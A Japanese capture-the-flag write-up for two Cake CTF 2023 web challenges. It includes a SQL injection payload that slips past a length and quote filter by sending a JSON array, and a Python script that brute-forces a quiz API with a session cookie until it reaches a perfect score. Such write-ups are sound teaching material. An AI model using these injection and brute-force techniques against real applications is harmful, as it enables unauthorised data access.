---
title: "Cake CTF 2023\nWriteup"
id: "cakectf-2023-writeup"
description: "Cake CTF 2023のWriteupです。"
author: "rikoteki"
createdAt: "2023-11-12"
isDraft: true
---

# Country DB [Web]

二文字の国コードをPOSTすると対応する国名を答えてくれるアプリケーションです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/da4e8f13-994c-4b05-8b1a-dc89de0e31aa)

検索処理のリクエスト・レスポンスです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/790d1256-5dbc-4f0f-b381-fae4d6e27025)

ソースコードが与えられるので確認すると、国コードをDBから検索する処理に明確なSQLインジェクション脆弱性があります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/efdcebb1-a779-4167-a97b-5794fcbed8f0)

<details>
  <summary>ソースコード</summary>

```python
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)

```
</details>

ただし、`code`に対して以下の条件が課されています。

- `len(code)`が2であること
- `'`が含まれていないこと

![image](https://github.com/r1k0t3k1/note/assets/57973603/8d944b98-553a-4107-84e8-438a215ef80d)


そのため、シンプルなSQLインジェクションは不可能です。

ただし、上記条件のチェックの前に`code`が文字列であることの確認がされていないため、オブジェクトを渡すことでチェックの回避が可能です。

まず、`len(code) == 2`の回避ですが、これは2要素の配列を渡すことで回避が可能です。

```json
{
  "code":[
    "",
    ""
  ]
}
```

あとは配列の1要素目にいつも通りのペイロードを渡せば　フラグが得られます。

最終的なペイロードは以下になりました。

```json
{
  "code":[
    "') union select flag from flag-- ",
    ""
  ]
}
```

![image](https://github.com/r1k0t3k1/note/assets/57973603/0229a448-aaeb-4ed4-a423-d8abb7432b7c)


# TOWFL [Web]

クイズに答えていって最終的にスコアが100ならフラグが表示されるようなアプリケーションです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/c9e24e72-87e4-42da-8551-f77f27bb4ce6)

ただし、問題文や選択肢の文章は人間には理解できない言語で構成されています。

![image](https://github.com/r1k0t3k1/note/assets/57973603/18891d07-da87-45c7-b522-0fa31ac069e9)

ソースコードが与えられるので処理内容を確認します。

<details>
<summary>ソースコード</summary>

```python
#!/usr/bin/env python3
import flask
import json
import lorem
import os
import random
import redis

REDIS_HOST = os.getenv("REDIS_HOST", "redis")
REDIS_PORT = int(os.getenv("REDIS_PORT", "6379"))

app = flask.Flask(__name__)
app.secret_key = os.urandom(16)

@app.route("/")
def index():
    return flask.render_template("index.html")

@app.route("/api/start", methods=['POST'])
def api_start():
    if 'eid' in flask.session:
        eid = flask.session['eid']
    else:
        eid = flask.session['eid'] = os.urandom(32).hex()

    # Create new challenge set
    db().set(eid, json.dumps([new_challenge() for _ in range(10)]))
    return {'status': 'ok'}

@app.route("/api/question/<int:qid>", methods=['GET'])
def api_get_question(qid: int):
    if qid <= 0 or qid > 10:
        return {'status': 'error', 'reason': 'Invalid parameter.'}
    elif 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    # Send challenge information without answers
    chall = json.loads(db().get(flask.session['eid']))[qid-1]
    del chall['answers']
    del chall['results']
    return {'status': 'ok', 'data': chall}

@app.route("/api/submit", methods=['POST'])
def api_submit():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    try:
        answers = flask.request.get_json()
    except:
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Get answers
    eid = flask.session['eid']
    challs = json.loads(db().get(eid))
    if not isinstance(answers, list) \
       or len(answers) != len(challs):
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Check answers
    for i in range(len(answers)):
        if not isinstance(answers[i], list) \
           or len(answers[i]) != len(challs[i]['answers']):
            return {'status': 'error', 'reason': 'Invalid request.'}

        for j in range(len(answers[i])):
            challs[i]['results'][j] = answers[i][j] == challs[i]['answers'][j]

    # Store information with results
    db().set(eid, json.dumps(challs))
    return {'status': 'ok'}

@app.route("/api/score", methods=['GET'])
def api_score():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    # Calculate score
    challs = json.loads(db().get(flask.session['eid']))
    score = 0
    for chall in challs:
        for result in chall['results']:
            if result is True:
                score += 1

    # Is he/she worth giving the flag?
    if score == 100:
        flag = os.getenv("FLAG")
    else:
        flag = "Get perfect score for flag"

    # Prevent reply attack
    flask.session.clear()

    return {'status': 'ok', 'data': {'score': score, 'flag': flag}}


def new_challenge():
    """Create new questions for a passage"""
    p = '\n'.join([lorem.paragraph() for _ in range(random.randint(5, 15))])
    qs, ans, res = [], [], []
    for _ in range(10):
        q = lorem.sentence().replace(".", "?")
        op = [lorem.sentence() for _ in range(4)]
        qs.append({'question': q, 'options': op})
        ans.append(random.randrange(0, 4))
        res.append(False)
    return {'passage': p, 'questions': qs, 'answers': ans, 'results': res}

def db():
    """Get connection to DB"""
    if getattr(flask.g, '_redis', None) is None:
        flask.g._redis = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0)
    return flask.g._redis

if __name__ == '__main__':
    app.run()
```

</details>

処理の流れとしては

- `/api/start`で試験セッションを発行
- `/api/submit`で答案提出
- `/api/score`で結果確認、ここでスコアが100ならフラグ表示

となっています。

ここで気になったのが発行されたセッションを破棄する処理が`/api/score`を呼ばれるまで走らないということです。

かつ、回答数の制限も無いようなので一度試験を開始して発行されたセッションで総当たりすることで100点を得ることができます。

- `/api/start`で試験セッションを発行
- `/api/submit`でスコアが100になるまで総当たり
- `/api/score`でフラグ取得

あとはスクリプトを書くだけです。

<details>
  <summary>solver.py</summary>

```python
import requests
import sys

answers = [[None for j in range(10)] for i in range(10)]

cookie = {"Cookie": "session=.eJwFwYsNwCAIBcBdmAAMP7sN-jBxhqa79-6lvqCHJiMYZtvbp2YoVoUGxNPLWmKNnGckDgO8bfXWZpUKrhEq9P34IRRG.ZU8yWg.PIv8BjWOiTBYx3PXh0nykpuS2v4"}

SCORE_UPDATE_URL = "http://towfl.2023.cakectf.com:8888/api/submit"
RESULT_URL = "http://towfl.2023.cakectf.com:8888/api/score"

score = 0

for i in range(0,10):
  for j in range(0,10):
    for k in range(0,4):
      answers[i][j] = k
      res1 = requests.post(
        SCORE_UPDATE_URL,
        json=answers,
        headers=cookie,
        proxies={"http":"http://localhost:8080", "https":"http://localhost:8080"})
      if res1.status_code == 200:
          res2 = requests.get(RESULT_URL, headers=cookie)
          json = res2.json()
          if json["data"]["flag"] != "Get perfect score for flag":
              print(json)
              sys.exit(0)
          if json["data"]["score"] > score:
              score = json["data"]["score"]
              break
```

</details>

スクリプトを実行してしばらく待つとフラグが得られます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/34625b3b-2d05-4a45-aec1-0bd6f358e098)


